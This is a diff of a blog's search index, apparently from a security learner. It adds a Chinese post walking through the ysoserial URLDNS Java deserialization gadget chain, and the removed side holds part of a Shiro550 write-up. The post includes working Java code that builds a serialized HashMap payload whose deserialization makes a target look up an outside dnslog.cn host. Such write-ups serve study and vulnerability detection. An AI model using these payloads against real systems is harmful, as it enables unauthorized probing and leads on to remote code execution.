@@ -139,6 +139,98 @@
       </tags>
   </entry>
   <entry>
+    <title>Java ysoserial学习之URLDNS(一)</title>
+    <url>/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/</url>
+    <content><![CDATA[<blockquote>
+<p>  雄关漫道真如铁 而今迈步从头越</p>
+</blockquote>
+<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><strong>URLDNS</strong> 是 ysoserial 中利用链的一个 payload，该 payload 的目的只有一个，就是确定目标系统上是否存在可控的 <code>readObject()</code> 方法，即是否存在Java 反序列化漏洞。该利用链具有如下特点:</p>
+<ul>
+<li>不限制jdk版本，使用 Java 内置的 URL 类，不依赖于任何的第三方库</li>
+<li>只对指定的 URL 发送 DNS 查询，不做其他操作</li>
+<li>在⽬目标没有回显的时候，能够通过DNS请求得知是否存在反序列列化漏洞</li>
+</ul>
+<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p><code>java.util.HashMap</code> 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求。</p>
+<p>我们从 <strong>ysoserial</strong> 项目<code>src/main/java/ysoserial/payloads/URLDNS.java</code> 的注释中可以看到 <strong>URLDNS</strong>的调用链（Gadget Chain):</p>
+<blockquote>
+<p>  Gadget Chain:<br>       HashMap.readObject()<br>         HashMap.putVal()<br>           HashMap.hash()<br>             URL.hashCode()</p>
+</blockquote>
+<h3 id="2-1-HashMap"><a href="#2-1-HashMap" class="headerlink" title="2.1 HashMap"></a>2.1 HashMap</h3><blockquote>
+<p>HashMap: java中的一种容器，用来存储内容，内容以键值对的形式存放。</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084353.png" alt="image-20210602184510047"></p>
+<p>先来看看 HashMap 自己实现的 readObject() 函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084403.png" alt="image-20210602173545433"></p>
+<p>这里通过一个 for 循环将 HashMap 中存储的key通过 <code>K key = (K) s.readObject();</code> <strong>反序列化后</strong>，调用 <strong>putVal</strong>和<strong>hash</strong>函数，也就是前面提到的Gadget Chain中的中间两个调用链，再来看看，<strong>hash</strong>这个函数的实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084411.png" alt="image-20210602173740650"></p>
+<p>调用了参数 key 的 <strong>hashCode</strong> 函数，而我们从<code>src/main/java/ysoserial/payloads/URLDNS.java</code>中可以得知这个key就是一个URL对象。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084416.png" alt="image-20210602175239536"></p>
+<p>接下来再看看 java 的基本类 URL 中关于 <strong>HashCode</strong> 的实现</p>
+<h3 id="2-2-hashCode"><a href="#2-2-hashCode" class="headerlink" title="2.2 hashCode"></a>2.2 hashCode</h3><p>我们来自己调用 URL 的 <code>hashCode</code> 函数来看看效果</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wursz7.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084423.png" alt="image-20210602174600694"></p>
+<p>可以得知<code>hashCode</code>触发了一次DNS请求，使用 Ctrl+右键 点进去看看该函数的具体实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084428.png" alt="image-20210602172051929"></p>
+<p>这里注意一下 <strong>handler</strong> 是一个 <strong>transient</strong>  关键字修饰的变量，不参与序列化。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084438.png" alt="image-20210603225458176"></p>
+<p>经过Debug跟踪发现会在 HashMap#readObject 的 <code>K key = (K) s.readObject();</code> 这行进入URL#readObject 的<code>getURLStreamHandler</code> 函数进行 handler 的赋值<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084443.png" alt="image-20210604080533266"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084449.png" alt="image-20210604080636339"></p>
+<p>hashCode 的默认值为-1, 然后接下来进入 <code>hashCode = handler.hashCode(this);</code>, 可以看到调用了<code>getHostAddress</code>函数，这个函数就是用来 DNS 解析，返回对应 IP 的。</p>
+<blockquote>
+<p>  URL 类将在比较时，如果两个主机名都可以解析为相同的 IP 地址，则认为两个主机是等效的；</p>
+</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084433.png" alt="image-20210602172427092"></p>
+<h3 id="2-3-put-触发"><a href="#2-3-put-触发" class="headerlink" title="2.3 put 触发"></a>2.3 put 触发</h3><p>ysoserial这里明确说了 put 函数来触发，通过使用 URL 对象来作为 key 就可以触发一次DNS请求。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084455.png" alt="image-20210602175512074"></p>
+<p>动手实验一下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r6gyvj.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084500.png" alt="image-20210602175733191"></p>
+<p>而put为什么会触发，看下put函数的实现</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084505.png" alt="image-20210603080617979"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084509.png" alt="image-20210603082700138"></p>
+<p>也是调用了hash(key) –&gt; key.hashCode() 跟之前一样，所以会在put进一个key为URL对象时，会进行一次DNS解析。</p>
+<h3 id="2-4-反序列化"><a href="#2-4-反序列化" class="headerlink" title="2.4 反序列化"></a>2.4 反序列化</h3><p>到了这里有什么用呢？迷了，明明是put时会进行一次DNS解析，看上去并没有和反序列化有什么关联。接下来该干嘛，网上其他文章直接结论了，而像我这种菜鸡，到这一步，完全没搞懂之后应该干啥，怎么把前面说的给串联起来。</p>
+<p>在看鸿蒙发布会时，终于想明白了，现在我们知道当 HashMap 传入一个URL对象时，会进行一次DNS解析，并且HashMap 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>，也就是说当一个Java应用存在反序列化漏洞时，我们可以通过传入一个序列化后的HashMap数据(将URL对象作为key放入HashMap)，当我们传入的数据到达该Java应用的反序列化漏洞点时,这时程序就会调用 HashMap 重写的<strong>readObject</strong> 函数来反序列化读取数据，也就是上述分析过程，然后就会触发 key.hashCode() 函数，进行一次DNS解析。</p>
+<h3 id="2-5-至善至美"><a href="#2-5-至善至美" class="headerlink" title="2.5 至善至美"></a>2.5 至善至美</h3><p>到上面已经可以作为漏洞探测了，但是 ysoserial 项目中有其他代码，我们可以看看具体是什么情况</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084516.png" alt="image-20210603214336126"></p>
+<p>这里通过继承 <code>URLStreamHandler</code> 类，重写了<code>openConnection</code> 和 <code>getHostAddress</code> 函数，然后</p>
+<p>将handler在创建URL时传入，其实这个传入的handler就是hashCode函数中的handler</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084530.png" alt="image-20210602172051929"></p>
+<p>前面提到过，HashMap#put 时也会调用 <strong>getHostAddress</strong> 函数进行一次DNS解析，这里就是通过重写的 <strong>getHostAddress</strong> 函数覆盖掉原来的函数，不进行DNS解析，防止在payload创建期间进行DNS解析，也就是一个防干扰功能。</p>
+<p>接下来看看 **Reflections.setFieldValue(u, “hashCode”, -1); <strong>这一行代码。Reflections</strong>类是 ysoserial 写的一个反射类<code>src/main/java/ysoserial/payloads/util/Reflections.java</code>，这是 <code>setFieldValue</code>函数</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">   <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">   field.set(obj, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">	    field = clazz.getDeclaredField(fieldName);</span><br><span class="line">	    setAccessible(field);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">return</span> field;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
+
+<p>之前在前置知识 <a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247484123&idx=1&sn=598d098ffe19be59547c09538716e196&chksm=c2829bc2f5f512d4e77af3085132c9cf18d9b2fec5abc1c0f6a120561d52be43be29ff0b2a92&scene=21#wechat_redirect">初探Java反序列化漏洞(二)</a>中讲到过反射, 上述代码就是通过反射来设置 URL 类的 hashCode的值为-1，这是因为在 HashMap#put 时，已经调用过一次hashCode() 函数，这时 hashCode的值就会改变，不再为-1，让其进行下一步执行DNS解析。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084535.png" alt="image-20210602211410050"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084542.png" alt="image-20210602211523937"></p>
+<p>那也就是说在下一步经过HashMap的<strong>readObject</strong>函数反序列化时, 因为此时 <code>hashCode != -1</code> ,会直接返回hashCode的值，不再进行调用 handler.hashCode(this) 。因此使用 <code>Reflections.setFieldValue(u, &quot;hashCode&quot;, -1); </code> 反射将 <strong>hashCode</strong>的值设为 <strong>-1</strong>。</p>
+<p>之后通过<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084549.png" alt="image-20210604082305067"> 执行序列化操作</p>
+<h2 id="0x03-代码模拟"><a href="#0x03-代码模拟" class="headerlink" title="0x03 代码模拟"></a>0x03 代码模拟</h2><p>我们来手动复原一下</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yhy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/6/2 16:21</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@github</span> https://github.com/yhy0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置 put 时不发起 dns 解析</span></span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UrlDNSTest</span>.SilentURLStreamHandler();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, <span class="string">&quot;http://atysqv.dnslog.cn&quot;</span>, handler);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 通过反射将put之后 hashCode 的 值重新赋值为 -1</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        hashMap.put(url,<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        f.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过序列化，发现确实没有在payload生成阶段发起dns解析。<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084603.png" alt="image-20210604082455201"></p>
+<p>接下来我们通过读取<code>out.bin</code> 文件将其反序列化来模拟漏洞点，</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">// 反序列化读取 out.bin 文件</span></span><br><span class="line">       <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;out.bin&quot;</span>));</span><br><span class="line">       ois.readObject();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084609.png" alt="image-20210604082654765">请求成功。</p>
+<p>最后回顾一下整个流程:			</p>
+<pre><code>1. 将URL对象作为key放入hashMap中，将其序列化发送给目标机器
+2. 如果目标机器存在反序列化漏洞，那么会执行`HashMap.readObject()` 将数据反序列化
+3. 在反序列化期间，为了还原hashmap的内容，会调用 `hash()` 方法，而`hash()`函数会调用传入参数的 `hashCode()`方法
+4. 当URL 对象的 `hashCode`属性值为 `-1` 时会调用 `handler.hashCode()`方法，而这个方法会进行一次DNS查询。
+</code></pre>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.gettoby.com/p/hk4t4bb9qttz">https://www.gettoby.com/p/hk4t4bb9qttz</a></p>
+]]></content>
+      <categories>
+        <category>漏洞原理</category>
+      </categories>
+      <tags>
+        <tag>漏洞原理</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Java ysoserial学习之CommonsCollections6(三)</title>
     <url>/2021/06/27/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections6(%E4%B8%89)/</url>
     <content><![CDATA[<blockquote>
@@ -423,89 +515,39 @@
       </tags>
   </entry>
   <entry>
-    <title>Java ysoserial学习之URLDNS(一)</title>
-    <url>/2021/06/04/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BURLDNS(%E4%B8%80)/</url>
+    <title>Java反序列化漏洞分析(二)-Shiro550</title>
+    <url>/2021/05/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90(%E4%BA%8C)-Shiro550/</url>
     <content><![CDATA[<blockquote>
-<p>  雄关漫道真如铁 而今迈步从头越</p>
+<p>  这是一篇失败的文章，要学的东西太多了，高看我自己了。终究是纸上得来终觉浅，绝知此事要躬行</p>
 </blockquote>
-<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p><strong>URLDNS</strong> 是 ysoserial 中利用链的一个 payload，该 payload 的目的只有一个，就是确定目标系统上是否存在可控的 <code>readObject()</code> 方法，即是否存在Java 反序列化漏洞。该利用链具有如下特点:</p>
-<ul>
-<li>不限制jdk版本，使用 Java 内置的 URL 类，不依赖于任何的第三方库</li>
-<li>只对指定的 URL 发送 DNS 查询，不做其他操作</li>
-<li>在⽬目标没有回显的时候，能够通过DNS请求得知是否存在反序列列化漏洞</li>
-</ul>
-<h2 id="0x02-原理"><a href="#0x02-原理" class="headerlink" title="0x02 原理"></a>0x02 原理</h2><p><code>java.util.HashMap</code> 实现了<code>Serializable</code> 接口，重写了 <code>readObject</code>, 在反序列化时会调用 <code>hash</code> 函数计算 key 的 hashCode.而 <code>java.net.URL</code> 的 <code>hashCode</code> 在计算时会调用 <code>getHostAddress</code> 来解析域名, 从而发出 DNS 请求。</p>
-<p>我们从 <strong>ysoserial</strong> 项目<code>src/main/java/ysoserial/payloads/URLDNS.java</code> 的注释中可以看到 <strong>URLDNS</strong>的调用链（Gadget Chain):</p>
+<h2 id="0x00-纠错"><a href="#0x00-纠错" class="headerlink" title="0x00 纠错"></a>0x00 纠错</h2><p>首先纠正一下上篇文章<a href="">Java反序列化漏洞分析(一)-Shiro550</a>的错误错误，上篇提到dnslog使用原生环境搭建没有打成功，这是<strong>错的</strong>、<strong>错的</strong>、<strong>错的</strong>，其实是可以打的。我给搞错了，<strong>URLDNS</strong> 这个利用链本身不依赖于任何第三方库，同时不限制jdk的版本，所以通常是用来检测反序列化的点（目标出网），我当时没打成功，是因为我做实验时，用了<strong>同一条</strong>dnslog的url打过一遍，第二遍死活不出结果，写这篇文章时又测了几次，发现是url的锅，要不停的变换才会一直出结果<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210524215703.png" alt="原生的shiro550可以使用dnslog探测"></p>
 <blockquote>
-<p>  Gadget Chain:<br>       HashMap.readObject()<br>         HashMap.putVal()<br>           HashMap.hash()<br>             URL.hashCode()</p>
+<p>  Java默认有TTL缓存，DNS解析会进行缓存，所以可能会出现第一次收到DNS的log，后面可能收不到的情况。</p>
 </blockquote>
-<h3 id="2-1-HashMap"><a href="#2-1-HashMap" class="headerlink" title="2.1 HashMap"></a>2.1 HashMap</h3><blockquote>
-<p>HashMap: java中的一种容器，用来存储内容，内容以键值对的形式存放。</p>
-</blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084353.png" alt="image-20210602184510047"></p>
-<p>先来看看 HashMap 自己实现的 readObject() 函数</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084403.png" alt="image-20210602173545433"></p>
-<p>这里通过一个 for 循环将 HashMap 中存储的key通过 <code>K key = (K) s.readObject();</code> <strong>反序列化后</strong>，调用 <strong>putVal</strong>和<strong>hash</strong>函数，也就是前面提到的Gadget Chain中的中间两个调用链，再来看看，<strong>hash</strong>这个函数的实现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084411.png" alt="image-20210602173740650"></p>
-<p>调用了参数 key 的 <strong>hashCode</strong> 函数，而我们从<code>src/main/java/ysoserial/payloads/URLDNS.java</code>中可以得知这个key就是一个URL对象。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084416.png" alt="image-20210602175239536"></p>
-<p>接下来再看看 java 的基本类 URL 中关于 <strong>HashCode</strong> 的实现</p>
-<h3 id="2-2-hashCode"><a href="#2-2-hashCode" class="headerlink" title="2.2 hashCode"></a>2.2 hashCode</h3><p>我们来自己调用 URL 的 <code>hashCode</code> 函数来看看效果</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://wursz7.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084423.png" alt="image-20210602174600694"></p>
-<p>可以得知<code>hashCode</code>触发了一次DNS请求，使用 Ctrl+右键 点进去看看该函数的具体实现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084428.png" alt="image-20210602172051929"></p>
-<p>这里注意一下 <strong>handler</strong> 是一个 <strong>transient</strong>  关键字修饰的变量，不参与序列化。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084438.png" alt="image-20210603225458176"></p>
-<p>经过Debug跟踪发现会在 HashMap#readObject 的 <code>K key = (K) s.readObject();</code> 这行进入URL#readObject 的<code>getURLStreamHandler</code> 函数进行 handler 的赋值<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084443.png" alt="image-20210604080533266"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084449.png" alt="image-20210604080636339"></p>
-<p>hashCode 的默认值为-1, 然后接下来进入 <code>hashCode = handler.hashCode(this);</code>, 可以看到调用了<code>getHostAddress</code>函数，这个函数就是用来 DNS 解析，返回对应 IP 的。</p>
+<h2 id="0x01-原生Shiro550执行命令"><a href="#0x01-原生Shiro550执行命令" class="headerlink" title="0x01 原生Shiro550执行命令"></a>0x01 原生Shiro550执行命令</h2><p>当使用<strong>URLDNS链</strong>打过去，在DNSLOG平台有回显的时候，就说明这个地方存在反序列化漏洞。</p>
+<p>但是要利用的话还得是使用CC链等利用链去进行命令的执行（shiro550中自带的是cc3.2.1版本的组件）。</p>
+<p>经过测试<strong>ysoserial</strong>拥有的CommonsCollections利用链从1-7都无法成功执行命令, 都是报错<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211912.png" alt="image-20210528211554019"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211926.png" alt="image-20210525211529910"></p>
+<p>无法反序列化一个数组，经常敲代码，修bug的都知道，报错的位置一般都在最下边的，去看看</p>
+<p><code>at org.apache.shiro.io.DefaultSerializer.deserialize(DefaultSerializer.java:77)</code> 直接点过去看看<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211917.png" alt="image-20210526220345069"></p>
+<p>可以看到在<a href="">初探Java反序列化漏洞(一)</a>中提到的重点函数<strong>readObject()<strong>函数，但是又有一点点不一样，它这里是</strong>new</strong>了一个<strong>ClassResolvingObjectInputStream</strong>,而非传统的<strong>ObjectInputStream</strong> 问题就可能出现在这里，全局搜索看下<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211939.png" alt="image-20210526220837880"></p>
+<p>这里是通过 <strong>ClassUtils.forName(osc.getName());<strong>来反射调用的，而前面都是通过</strong>Class.forName(“java.lang.Runtime”);</strong> 来进行反射执行命令的<img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210529211949.png" alt="image-20210526221020003"></p>
+<p>直接在这里下断点，然后使用CC2链打一下，调试半天也没看懂，太菜了，先记下 参考文章中说的是</p>
 <blockquote>
-<p>  URL 类将在比较时，如果两个主机名都可以解析为相同的 IP 地址，则认为两个主机是等效的；</p>
+<p>  Shiro resovleClass 使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084433.png" alt="image-20210602172427092"></p>
-<h3 id="2-3-put-触发"><a href="#2-3-put-触发" class="headerlink" title="2.3 put 触发"></a>2.3 put 触发</h3><p>ysoserial这里明确说了 put 函数来触发，通过使用 URL 对象来作为 key 就可以触发一次DNS请求。</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084455.png" alt="image-20210602175512074"></p>
-<p>动手实验一下</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UrlDNSTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://r6gyvj.dnslog.cn&quot;</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;yhy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084500.png" alt="image-20210602175733191"></p>
-<p>而put为什么会触发，看下put函数的实现</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084505.png" alt="image-20210603080617979"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210604084509.png" alt="image-20210603082700138"></p>
-<p>也是调用了hash(key) –&gt; key.hashCode() 跟之前一样，所以会在put进一个key为URL对象时，会进行一次DNS解析。</p>
-<h3 id="2-4-反序列化"><a href="#2-4-反序列化" class="headerlink" title="2.4 反序列化"></a>2.4 反序列化</h3><p>到了这里有什么用呢？迷了，明明是put时会进行一次DNS解析，看上去并没有和反序列化有什么关联。接下来该干嘛，网上其他文章直接结论了，而像我这种菜鸡，到这一步，完全没搞懂之后应该干啥，怎么把前面说的给串联起来。</p>
